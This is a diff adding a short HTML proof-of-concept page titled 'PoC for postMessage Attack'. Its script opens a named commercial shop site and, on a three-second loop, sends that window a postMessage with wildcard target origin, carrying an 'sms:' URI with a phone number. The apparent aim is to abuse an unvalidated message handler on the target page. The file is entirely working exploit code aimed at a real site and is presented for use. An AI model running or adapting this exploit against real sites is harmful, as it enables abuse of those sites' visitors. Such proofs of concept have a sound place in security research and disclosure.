@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>PoC for postMessage Attack</title>
+</head>
+<body>
+    <script type="text/javascript">
+        let j = window.open('https://shop.whoop.com/en-us');
+
+        setInterval(() => {
+            if (j) {
+                j.postMessage('sms:+263777054115?body=test', '*');
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
